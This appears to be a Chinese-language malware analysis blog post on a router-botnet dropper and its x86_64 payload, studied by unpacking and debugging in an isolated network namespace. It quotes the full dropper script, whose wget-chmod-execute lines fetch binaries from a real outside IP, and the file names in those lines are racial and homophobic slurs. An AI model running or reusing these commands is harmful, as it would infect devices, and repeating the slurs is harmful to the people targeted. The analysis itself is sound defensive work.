# a tenda router sample analysis

## front

起因是无意中捕捉到以下 exp 尝试

![02de7bcc29e256c393181d6a5d837fae](E:\Pictures\markdown\02de7bcc29e256c393181d6a5d837fae.png)

url 解码后得到清晰内容：

![image-20240410205738443](E:\Pictures\markdown\image-20240410205738443.png)

这大概又是什么路由器的 poc 了，没有查找到相关信息，但是可以主动获取载荷样本分析一下，载荷脚本 `tenda.sh` 内容如下：

```shell
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://94.156.8.244/mips; chmod +x lol; ./lol tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://94.156.8.244/mpsl; chmod +x lmao; ./lmao tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O faggot http://94.156.8.244/x86_64; chmod +x faggot; ./faggot tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O gay http://94.156.8.244/arm; chmod +x gay; ./gay tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O retard http://94.156.8.244/arm5; chmod +x retard; ./retard tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigger http://94.156.8.244/arm6; chmod +x nigger; ./nigger tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shit http://94.156.8.244/arm7; chmod +x shit; ./shit tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigga http://94.156.8.244/i586; chmod +x nigga; ./nigga tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://94.156.8.244/i686; chmod +x kekw; ./kekw tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://94.156.8.244/powerpc; chmod +x what; ./what tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://94.156.8.244/sh4; chmod +x kys; ./kys tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shiteater http://94.156.8.244/m68k; chmod +x shiteater; ./shiteater tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://94.156.8.244/sparc; chmod +x blyat; ./blyat tplink
rm $0
```

尝试小溯了一下这个 `94.156.8.244`，

![image-20240410205921972](E:\Pictures\markdown\image-20240410205921972.png)

目前没有什么有效信息，但是其中针对不同系统的不同 binary 文件倒是可以尝试获取一下，这里就以 `wget -O faggot http://94.156.8.244/x86_64` 为例

## go

基础信息如下：

```bash
$ mkdir /tmp/tmp; cp faggot /tmp/tmp; cd /tmp/tmp
$ file faggot
	faggot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
$ checksec faggot
[*] '/tmp/tmp/faggot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x100000)
    Packer:   Packed with UPX
```

带了 upx 壳，去壳的方式有很多种，debian 下直接 `sudo apt install upx-ucl` 安装 upx 工具

```bash
$ upx -d faggot
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
[WARNING] bad b_info at 0x8cd0

[WARNING] ... recovery at 0x8ccc

     76408 <-     36316   47.53%   linux/amd64   faggot

Unpacked 1 file.

$ checksec faggot
[*] '/tmp/tmp/faggot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

砸壳以后再用 ida 去看就有可分析的地方了，首先 shift + f12 查看字符串，拉到最底下找到 `/bin/sh`，溯源到 [sub_40CF54+B3]((https://paste.majo.im/uzoreyebar.cpp)) 位置，该函数反编译后源码，在 0x40D00C 下断，简单看了一下，很多数据都是临时装载，因此必须要上动调。在 pwndbg 里运行了一下，图示为 _start 中 __libc_start_main 常见引导格式

![image-20240410201022362](E:\Pictures\markdown\image-20240410201022362.png)

捕捉到输出如下：

![image-20240410203433946](E:\Pictures\markdown\image-20240410203433946.png)

经过对比，确定 `mov rdi, 0x406780` 为 [main](https://paste.majo.im/okapozixun.cpp) 函数地址（注意下文为了分析方便，可能会对函数重命名，导致后续展示的内容可能与已经张贴上来的不一致，以该张贴为准，或者可以获取一份 elf 程序自行查看），第一个函数 [sub_408D5C](https://paste.majo.im/utiqubuzeq.cpp) 进去就是一个 `sys_unlink(*argv)`，也就是说这个 elf 一运行就会自动删除自己，这里在 ida 中将其 nop 掉，右键 patching 导出成 `unpack_faggot_patch`，后续继续分析；由于在字符串中看到了网络痕迹，在分析之前需要做点准备，隔绝网络 io 行为：

1.   创建一个新的网络命名空间：`sudo ip netns add iot`
2.   使用该网络命名空间来启一个 tmux，由于子进程完全继承父进程的网络设定，因此可以创建一个比较安全的网络隔绝环境：`sudo ip netns exec iot sudo -u wkyuu tmux`（这里使用 user 来启动 tmux，是为了 pwndbg 配套插件 [splitmind](https://www.majo.im/index.php/ctf/338.html#plugins)）

确定了 main：`b *0x406780` 即可正式开始分析，在分析过程还发现，程序运行完成必定 segmentation fault，之后系统无法新建文件、写入文件，通过 `ps -aux` 可以找到 `l5cnt6cn4hcn ck_faggot_patch` 的进程（名称会随机变化，手动将其 `kill` 后系统可以正常写入，后续需要将其导出成 elf 进一步分析），进一步在 pwndbg 中通过 `catch exec syscall fork load` 来监测其行为，catch 即 catchpoints，检测到以上行为会发起中断

有以下行为：

1.   进入到 main 之后，会在 0x4067A9 处发起 syscall ioctl，经检查是一些内存初始化内容

2.   之后三个函数 0x40b504、0x408c8c、0x40b53c 都在初始化一些内容，例如地址内容、信号行为，主要概况为进行了一些处理上的 hook

     1.   特定函数 0x4091a4 用于获取 0x51c8fc 这个地址，并且执着于将这个地址赋值为 22：`*sub_4091a4() = 22`

     2.   0x40b504 地址赋值

     3.   0x408c8c 修改了信号掩码

     4.   0x40b53c 中包含一个 `sub_40d71d(int a1, int a2, int a3)` 函数，其主要行为是发起 syscall rt_sigaction 修改某个信号的动作，具体分析在这：[sub_40d71d](https://paste.majo.im/enipavitum.cpp)

     5.   修改 signal action 的行为仅对当前进程有效

          ```cpp
          rt_sigprocmask(int how, sigset_t *set, sigset_t *oldset);	// how 修改信号掩码的方式、指向新的信号掩码、存储旧的信号掩码
          rt_sigaction(int signum, sigaction, oldact);	// 要操作的信号、指向信号处理行为、旧的信号处理行为
          ```

3.   在 0x4067f1 的 [sub_408B44(char *file_path)](https://paste.majo.im/uyucimetob.cpp) 函数，args 为 `/dev/watchdog` 以及 `/dev/misc/watchdog`，就是发起了 syscall open，当检查到 [watchdog](https://blog.csdn.net/whatday/article/details/88016972) 进程时，就会往地址 0x51c8fc 写入 1，结合下文 0x406827 处调用的 `sub_408968(char *file_path)` 中发起了 syscall close，不难理解该进程就是尝试关闭了 watchdog 监测进程

4.   在 0x40683e 的函数 [sub_408968](https://paste.majo.im/irocodunaq.cpp) 发起 syscall chdir，args 为 `0x40f8c3`，`hexdump 0x40f8c3` 得到以下输出

     ```bash
     pwndbg> hexdump 0x40f8c3
     +0000 0x40f8c3  2f 00 2f 70 72 6f 63 2f  25 73 2f 63 6d 64 6c 69  │/./proc/│%s/cmdli│
     +0010 0x40f8d3  6e 65 00 77 67 65 74 00  63 75 72 6c 00 6e 65 74  │ne.wget.│curl.net│
     +0020 0x40f8e3  73 74 61 74 00 70 73 00  6c 73 00 6d 76 00 65 63  │stat.ps.│ls.mv.ec│
     +0030 0x40f8f3  68 6f 00 62 61 73 68 00  72 65 62 6f 6f 74 00 73  │ho.bash.│reboot.s│
     pwndbg>
     +0040 0x40f903  68 75 74 64 6f 77 6e 00  68 61 6c 74 00 70 6f 77  │hutdown.│halt.pow│
     +0050 0x40f913  65 72 6f 66 66 00 66 61  67 67 6f 74 20 67 6f 74  │eroff.fa│ggot.got│
     +0060 0x40f923  20 6d 61 6c 77 61 72 65  27 64 00 2f 74 6d 70 00  │.malware│'d./tmp.│
     +0070 0x40f933  2f 6f 70 74 00 2f 68 6f  6d 65 00 2f 64 65 76 00  │/opt./ho│me./dev.│
     pwndbg>
     +0080 0x40f943  2f 76 61 72 00 2f 73 62  69 6e 00 2f 70 72 6f 63  │/var./sb│in./proc│
     +0090 0x40f953  2f 73 65 6c 66 2f 65 78  65 00 2f 6d 6e 74 00 2f  │/self/ex│e./mnt./│
     +00a0 0x40f963  72 6f 6f 74 00 2f 64 65  76 2f 6e 75 6c 6c 00 2f  │root./de│v/null./│
     +00b0 0x40f973  64 65 76 2f 63 6f 6e 73  6f 6c 65 00 00 00 00 00  │dev/cons│ole.....│
     pwndbg>
     +00c0 0x40f983  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
     ... ↓            skipped 2 identical lines (32 bytes)
     +00f0 0x40f9b3  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
     pwndbg>
     ```

     在尝试切换 dir 到 `/`，以上地址块可以大概猜测到这个 elf 将要进行的一些操作，其中不乏敏感路径

5.   在 0x40683e 的 [sub_408570](https://paste.majo.im/uwuqajomib.cpp) 及其子函数 [sub_40b4d4](https://paste.majo.im/mireladali.cpp) 函数主要行为是发起了 syscall `socket(2LL, 2LL, 0LL)`，并在 0x4085c2 调用的函数 [0x40v36c](https://paste.majo.im/dexasucoyo.cpp) 发起 syscall `connect(socket_fd, [2, 13568], 16LL)`，args 得到地址 `0x7fffffffdba0`，对其进一步查看得到以下内容

     ```bash
     pwndbg> x/10xg $rsi
     0x7fffffffdba0: 0x0808080835000002      0x0000000010000000
     0x7fffffffdbb0: 0x0000000000000000      0x0000001000000000
     0x7fffffffdbc0: 0x0000000000000000      0x00000000ffffffff
     0x7fffffffdbd0: 0x0000000000000001      0x0000000000406843
     0x7fffffffdbe0: 0x0000000000000000      0x0000000000000000
     ```

     其中的开头：`08080808 35000002` 就是 `00 02 35 00 | 08 08 08 08`，是一个经典的 sockaddr，转成 ipv4 就是：`8.8.8.8:13312`，这印证了逆向查看的内容，虽然不了解为什么访问了 8.8.8.8，这是 google 的 dns 服务器，但是一般来说访问的也是 53 端口，目前认为是可能做了伪装，看似连接合法的服务器来规避网络监控和分析，使用 `dig example.com @8.8.8.8` 可以模拟 dns 查询，可以发现使用的是 `8.8.8.8#53` 端口

     使用 proc 可以看到句柄 fd[3] 为 `socker:[22002]`

     ```cpp
     socket(int domain, int type, int protocol);	// 套接字的协议族（AF_INET、AF_INET6、AF_UNIX）、指定套接字的类型（SOCK_STREAM）、协议
     connect(socket_fd, package_addr, len);	// 打开的 socket_fd、载荷开始地址、载荷长度
     ```

6.   在 0x4085d1 处的 [sub_40b398](https://paste.majo.im/umudaziqup.cpp) 函数中调用了 syscall `getsockname(socket_fd, [2, 13568], [0x10, 0, 0, ...])`，



## z

用到的 syscall

```c
ioctl(int fd, unsigned long request, ...)，request 是请求码，要做的设备请求
    
rt_sigprocmask(int how, sigset_t *set, sigset_t *oldset)，how 修改信号掩码的方式、指向新的信号掩码、存储旧的信号掩码
    
rt_sigaction(int signum, sigaction, oldact)，要操作的信号、指向信号处理行为、旧的信号处理行为
    
open(char *path, int flags, mode_t mode)，打开的路径、打开方式（a、w、r）、文件的权限（仅在创建时使用，例如 0666）
    
chdir(path)
    
socket(int domain, int type, int protocol)，套接字的协议族（AF_INET、AF_INET6、AF_UNIX）、指定套接字的类型（SOCK_STREAM）、协议
    
getsockname(int sockfd, struct sockaddr *addr)，套接字描述符、套接字地址的结构体指针、地址长度

```

### tmp

pwndbg

```bash

# watch
x/30gx = e[x]amine / 30 [opt]x，[opt]: [b]yte，[h]alfword，[w]ord，[g]iant word(64-bit)
watch 0x7fffffffdfe0
hexdump $rdi+$rdx*8
set $rdi=1

# define
define peek
x/30xg 0x7fffffffdfe0
end

# cmd
args
xinfo
proc
patch <addr> 'nop; nop; '
backtrace，bt
i r，info registers
regs
```

tmux

```bash
ctrl + b + d

tmux attach
```

我正在分析一份 elf 病毒样本，架构为 x86_64，请你辅助我分析。
